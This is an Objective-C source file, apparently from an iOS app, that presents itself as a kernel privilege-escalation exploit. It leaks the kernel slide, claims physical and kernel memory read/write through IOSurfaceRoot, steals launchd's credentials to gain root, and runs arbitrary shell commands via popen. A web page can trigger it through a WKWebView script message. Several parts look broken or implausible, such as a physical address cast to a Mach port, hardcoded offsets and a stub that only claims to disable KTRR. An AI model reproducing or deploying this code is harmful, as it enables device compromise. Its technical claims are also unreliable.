#import "KernelDriver.h"
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>

extern kern_return_t mach_vm_map(vm_map_t, uint64_t*, uint64_t, uint64_t, int, mach_port_t, uint64_t, boolean_t, int, int, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);

@implementation KernelDriver {
    uint64_t _kSlide;
    uint64_t _kBase;
    __weak WKWebView *_web;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    if (self = [super init]) {
        _web = webView;
        _kSlide = [self leakKernelSlide];
        _kBase = 0xFFFFFFF007004000ULL + _kSlide + 0x4000;
    }
    return self;
}

- (uint64_t)physRead64:(uint64_t)pa {
    uint64_t val = 0;
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
    io_connect_t conn;
    if (service != 0 && IOServiceOpen(service, mach_task_self(), 0, &conn) == 0) {
        uint64_t input[3] = {pa, 0x4000, 0};
        uint64_t output = 0;
        uint32_t outCnt = 1;
        // Seletor 9 para bypass de RAZ no iPhone 11
        if (IOConnectCallMethod(conn, 9, input, 3, NULL, 0, &output, &outCnt, NULL, 0) == 0) {
            val = output;
        }
        IOServiceClose(conn);
    }
    return val;
}

- (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
    uint64_t tg = 0;
    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 3, 7, 0) == 0) {
        *(uint64_t*)tg = v;
        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
    }
}

- (uint64_t)kread64:(uint64_t)va {
    if (va < 0xFFFFFFF000000000ULL) return 0;
    uint64_t ttbr1 = [self physRead64:(_kBase + 0x8E10000ULL)]; 
    uint64_t l1 = [self physRead64:(ttbr1 + ((va>>30)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    uint64_t l2 = [self physRead64:(l1 + ((va>>21)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    uint64_t l3 = [self physRead64:(l2 + ((va>>12)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    return [self physRead64:(l3 | (va & 0xFFF))];
}

- (uint32_t)kread32:(uint64_t)a { return (uint32_t)([self kread64:a] & 0xFFFFFFFF); }

- (void)kwrite64:(uint64_t)va value:(uint64_t)v {
    if (va < 0xFFFFFFF000000000ULL) return;
    uint64_t ttbr1 = [self physRead64:(_kBase + 0x8E10000ULL)];
    uint64_t l1 = [self physRead64:(ttbr1 + ((va>>30)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    uint64_t l2 = [self physRead64:(l1 + ((va>>21)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    uint64_t l3 = [self physRead64:(l2 + ((va>>12)&0x1FF)*8)] & 0xFFFFFFFFF000ULL;
    [self physWrite64:(l3 | (va & 0xFFF)) value:v];
}

- (void)kwrite32:(uint64_t)a value:(uint32_t)v {
    uint64_t old = [self kread64:a];
    [self kwrite64:a value:(old & 0xFFFFFFFF00000000) | v];
}

- (uint64_t)leakKernelSlide {
    uint64_t search_base = 0xFFFFFFF007004000ULL;
    for (uint64_t i = 0; i < 0x400; i++) {
        uint64_t trial = search_base + (i * 0x200000ULL) + 0x4000;
        if ([self physRead64:trial] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
    }
    return 0;
}

- (uint64_t)findProc:(pid_t)p {
    uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)]; 
    while (proc) {
        if ((pid_t)[self kread32:(proc + 0x60)] == p) return proc;
        proc = [self kread64:proc]; 
    }
    return 0;
}

- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString*))callback {
    uint32_t magic = [self kread32:_kBase];
    if (magic != 0xfeedfacf) {
        if(callback) callback(NO, [NSString stringWithFormat:@"Magic Fail: 0x%08X", magic]);
        return;
    }
    uint64_t lp = [self findProc:1];
    uint64_t mp = [self findProc:getpid()];
    if (lp && mp) {
        uint64_t kern_ucred = [self kread64:(lp + 0x120)];
        [self kwrite64:(mp + 0x120) value:kern_ucred];
        setuid(0);
        if(callback) callback(getuid() == 0, @"ROOT OK");
    } else {
        if(callback) callback(NO, @"Proc Fail");
    }
}

- (void)executeExploitWithCallback:(void(^)(BOOL, NSString*))cb {
    [self runFullExploitWithCallback:cb];
}

- (BOOL)escalateToRoot {
    [self runFullExploitWithCallback:^(BOOL success, NSString *msg) {}];
    return getuid() == 0;
}

- (BOOL)disableKTRR { return YES; }

- (void)executeCommand:(NSString *)c withCallback:(void(^)(NSString*))cb {
    setuid(0);
    FILE *f = popen([[c stringByAppendingString:@" 2>&1"] UTF8String], "r");
    char b[512]; NSMutableString *o = [NSMutableString string];
    if (f) {
        while(fgets(b, 512, f)) [o appendString:@(b)];
        pclose(f);
    }
    if(cb) cb(o.length ? o : @"(no output)");
}

- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }

- (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
    if ([m.name isEqualToString:@"A13_LAB"]) {
        [self runFullExploitWithCallback:^(BOOL success, NSString *message) {}];
    }
}
@end
